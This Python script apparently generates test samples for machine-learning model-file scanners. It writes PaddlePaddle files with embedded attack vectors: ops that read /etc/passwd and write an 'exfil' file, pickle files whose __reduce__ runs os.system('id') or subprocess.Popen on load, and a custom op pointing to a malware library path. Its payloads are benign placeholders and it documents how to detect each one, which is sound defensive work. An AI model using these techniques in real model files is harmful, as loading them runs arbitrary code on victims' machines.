"""
PaddlePaddle Attack Vector Generator

Generates real PaddlePaddle-format binary files (.pdmodel, .pdiparams, .pkl)
without requiring the paddlepaddle package.

PaddlePaddle's `.pdmodel` files are Protocol Buffer serialisations of
`framework.proto::ProgramDesc`.  We hand-craft minimal valid protobuf
binaries so that scanners parsing the format can detect the embedded
attack strings.

Wire-format helpers implement the protobuf binary encoding spec:
  https://protobuf.dev/programming-guides/encoding/

Requires: pickle, struct (stdlib only)
"""

import pickle
import struct
from pathlib import Path
from typing import Dict, List, Tuple


# ---------------------------------------------------------------------------
# Minimal protobuf wire-format helpers
# ---------------------------------------------------------------------------

def _varint(n: int) -> bytes:
    """Encode a non-negative integer as a protobuf base-128 varint."""
    buf = []
    while True:
        towrite = n & 0x7F
        n >>= 7
        if n:
            buf.append(towrite | 0x80)
        else:
            buf.append(towrite)
            break
    return bytes(buf)


def _pf_str(field: int, value: str) -> bytes:
    """Encode a protobuf string field (wire type 2)."""
    data = value.encode("utf-8")
    return _varint((field << 3) | 2) + _varint(len(data)) + data


def _pf_msg(field: int, data: bytes) -> bytes:
    """Encode a protobuf embedded-message / bytes field (wire type 2)."""
    return _varint((field << 3) | 2) + _varint(len(data)) + data


def _pf_int32(field: int, value: int) -> bytes:
    """Encode a protobuf int32 field (wire type 0, varint)."""
    return _varint((field << 3) | 0) + _varint(value & 0xFFFF_FFFF)


def _make_op(op_type: str, attrs: Dict[str, str]) -> bytes:
    """Build a serialised OpDesc with the given type and string attributes.

    OpDesc fields (framework.proto):
      3 = type (string)
      4 = attrs (repeated OpDesc_Attr)

    OpDesc_Attr fields:
      1 = name (string)
      2 = type (int32, 5 = STRING)
      4 = s (string — value for STRING attrs)
    """
    op = _pf_str(3, op_type)
    for attr_name, attr_val in attrs.items():
        attr_msg = (
            _pf_str(1, attr_name)
            + _pf_int32(2, 5)        # type=5 → STRING
            + _pf_str(4, attr_val)
        )
        op += _pf_msg(4, attr_msg)
    return op


def _make_pdmodel(ops: List[bytes]) -> bytes:
    """Wrap a list of serialised OpDesc bytes into a minimal ProgramDesc.

    ProgramDesc field 1 = blocks (repeated BlockDesc)
    BlockDesc field 1 = idx, field 3 = ops (repeated OpDesc)
    """
    block = _pf_int32(1, 0)  # idx = 0
    for op in ops:
        block += _pf_msg(3, op)
    return _pf_msg(1, block)


# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------

class PaddlePaddleAttackGenerator:
    """Generate PaddlePaddle-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "paddlepaddle_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    # ------------------------------------------------------------------
    # 1. File operations — .pdmodel with ReadFile / WriteFile ops
    # ------------------------------------------------------------------
    def generate_suspicious_file_operations(self) -> Tuple[str, int]:
        """Craft a .pdmodel whose op graph contains ReadFile and WriteFile nodes.

        Attack Vector:
            A ProgramDesc with two ops: "read_file" targeting /etc/passwd
            and "write_file" targeting /tmp/exfil.txt.  PaddlePaddle runtimes
            that execute op graphs without an op allowlist perform the I/O.

        Severity: HIGH
        Detection: Op-type allowlist, file-path scanning
        """
        filepath = self.output_dir / "01_file_operations.pdmodel"

        ops = [
            _make_op("read_file",  {"filename": "/etc/passwd",   "encoding": "utf-8"}),
            _make_op("write_file", {"filename": "/tmp/exfil.txt", "content": "pwned"}),
        ]
        with open(filepath, "wb") as f:
            f.write(_make_pdmodel(ops))

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    # ------------------------------------------------------------------
    # 2. Pickle payload — real .pkl with __reduce__ RCE
    # ------------------------------------------------------------------
    def generate_embedded_pickle_payload(self) -> Tuple[str, int]:
        """Real .pkl masquerading as PaddlePaddle parameter weights.

        Attack Vector:
            PaddlePaddle's paddle.load() falls back to pickle for legacy
            .pkl parameter files.  __reduce__ triggers arbitrary execution
            on load.

        Severity: CRITICAL
        Detection: Pickle opcode analysis, REDUCE opcode detection
        """
        filepath = self.output_dir / "02_pickle_payload.pkl"

        class MaliciousPaddleParams:
            """Mimics a serialised state_dict / param file."""

            def __reduce__(self):
                import os
                return (os.system, ("id",))

        with open(filepath, "wb") as f:
            pickle.dump(MaliciousPaddleParams(), f, protocol=2)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    # ------------------------------------------------------------------
    # 3. Custom operator — .pdmodel + .pdiparams with library-path op
    # ------------------------------------------------------------------
    def generate_custom_operator_rce(self) -> Tuple[str, int]:
        """Craft a .pdmodel whose op references an external native library.

        Attack Vector:
            A ProgramDesc op of type "custom_op" with a "library_path"
            attribute pointing to a malicious .so.  PaddlePaddle's custom-op
            loader calls dlopen() on the path at graph execution.

        Severity: CRITICAL
        Detection: Custom-op allowlist, library-path scanning
        """
        model_path = self.output_dir / "03_custom_operator.pdmodel"
        params_path = self.output_dir / "03_custom_operator.pdiparams"

        ops = [
            _make_op("custom_op", {
                "library_path": "/path/to/malware.so",
                "func_name":    "MaliciousKernel",
                "op_name":      "MaliciousOp",
            }),
        ]
        with open(model_path, "wb") as f:
            f.write(_make_pdmodel(ops))

        # .pdiparams: minimal binary with embedded pickle bytes inside the
        # parameter blob (mirrors paddle.save behaviour for malicious params)
        class MaliciousParam:
            def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (["echo", "pdiparams_rce"],))

        param_pickle = pickle.dumps(MaliciousParam(), protocol=2)
        # Prefix with a uint32 "tensor count" header to mimic pdiparams layout
        pdiparams_data = struct.pack("<I", 1) + param_pickle
        with open(params_path, "wb") as f:
            f.write(pdiparams_data)

        self.generated_files.append(str(model_path))
        self.generated_files.append(str(params_path))
        return str(model_path), 1

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "file_operations":  self.generate_suspicious_file_operations(),
            "pickle_payload":   self.generate_embedded_pickle_payload(),
            "custom_operator":  self.generate_custom_operator_rce(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = PaddlePaddleAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
